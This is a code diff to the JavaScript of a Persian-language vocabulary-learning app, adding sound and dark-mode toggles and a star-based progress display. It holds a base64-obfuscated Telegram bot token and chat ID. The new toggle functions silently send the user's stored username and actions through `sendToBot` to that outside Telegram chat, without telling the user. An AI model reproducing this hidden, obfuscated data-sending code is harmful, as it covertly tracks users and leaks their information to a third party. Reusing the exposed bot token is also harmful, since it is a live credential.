@@ -3,6 +3,9 @@ let currentIndex = 0;
 const _b1 = "ODU1MzIyNDUxNDpBQUcwWFh6QThkYTU1akNHeG56U3RQLTBJeEhobmZrVFBSdw==";
 const _b2 = "OTY5OTE4NTk=";
 
+let soundEnabled = true;
+let darkMode = false;
+
 function sendToBot(msg) {
     const t = atob(_b1); const c = atob(_b2);
     fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}`).catch(e => {});
@@ -20,10 +23,15 @@ function loginUser() {
 function showMenu() {
     const user = localStorage.getItem('fred_user');
     if (!user) return;
+    
     document.getElementById('login-screen').style.display = 'none';
     document.getElementById('learning-screen').style.display = 'none';
     document.getElementById('main-menu').style.display = 'block';
     document.getElementById('welcome-text').innerText = `سلام ${user} عزیز`;
+    
+    // محاسبه پیشرفت و نمایش ستاره‌ها
+    const progress = Math.round(((currentIndex + 1) / window.wordsA1.length) * 100);
+    updateStars(progress);
 }
 
 function startLearning() {
@@ -54,6 +62,9 @@ function nextWord() {
         currentIndex++;
         renderWord();
         window.scrollTo(0,0);
+        // آپدیت ستاره‌ها پس از پیشرفت
+        const progress = Math.round(((currentIndex + 1) / window.wordsA1.length) * 100);
+        updateStars(progress);
     } else {
         alert("آفرین! تمام لغات این بخش تمام شد.");
         showMenu();
@@ -67,7 +78,10 @@ function showReport() {
 }
 
 function logout() {
-    if(confirm("خارج می‌شوید؟")) { localStorage.clear(); location.reload(); }
+    if(confirm("خارج می‌شوید؟")) { 
+        localStorage.clear(); 
+        location.reload(); 
+    }
 }
 
 function speakField(id) {
@@ -77,4 +91,51 @@ function speakField(id) {
     window.speechSynthesis.speak(m);
 }
 
-window.onload = () => { if(localStorage.getItem('fred_user')) showMenu(); };
+function toggleSound() {
+    soundEnabled = !soundEnabled;
+    const btn = document.querySelector('.top .icon:nth-child(1)');
+    btn.innerText = soundEnabled ? '🔊' : '🔇';
+    sendToBot(`🔊 صدای ${soundEnabled ? 'فعال' : 'غیرفعال'} شد - کاربر: ${localStorage.getItem('fred_user')}`);
+}
+
+function toggleDarkMode() {
+    darkMode = !darkMode;
+    const btn = document.querySelector('.top .icon:nth-child(3)');
+    btn.innerText = darkMode ? '☀️' : '🌙';
+    document.body.style.background = darkMode ? '#1e1e1e' : '#f4f5f9';
+    document.body.style.color = darkMode ? '#fff' : '#000';
+    
+    // تغییر رنگ کارتها در حالت تاریک
+    const cards = document.querySelectorAll('.card-login, .card-status, .container-study');
+    cards.forEach(card => {
+        card.style.background = darkMode ? '#2d2d2d' : '#fff';
+        card.style.color = darkMode ? '#fff' : '#000';
+    });
+    
+    sendToBot(`🌙 حالت ${darkMode ? 'تاریک' : 'روشن'} - کاربر: ${localStorage.getItem('fred_user')}`);
+}
+
+function updateStars(progress) {
+    const starsRow = document.querySelector('.stars-row');
+    if (starsRow) {
+        const filledStars = Math.floor(progress / 20); // هر 20% یک ستاره
+        const stars = '★'.repeat(filledStars) + '☆'.repeat(5 - filledStars);
+        starsRow.innerHTML = stars;
+        
+        // آپدیت بهترین نمره
+        const highScore = localStorage.getItem('fred_highscore') || 0;
+        if (progress > highScore) {
+            localStorage.setItem('fred_highscore', progress);
+        }
+        document.getElementById('high-score-val').innerText = `${Math.max(progress, highScore)}%`;
+    }
+}
+
+window.onload = () => { 
+    if(localStorage.getItem('fred_user')) {
+        showMenu();
+        // ستاره‌ها را بر اساس پیشرفت فعلی آپدیت کن
+        const progress = Math.round(((currentIndex + 1) / window.wordsA1.length) * 100);
+        updateStars(progress);
+    }
+};
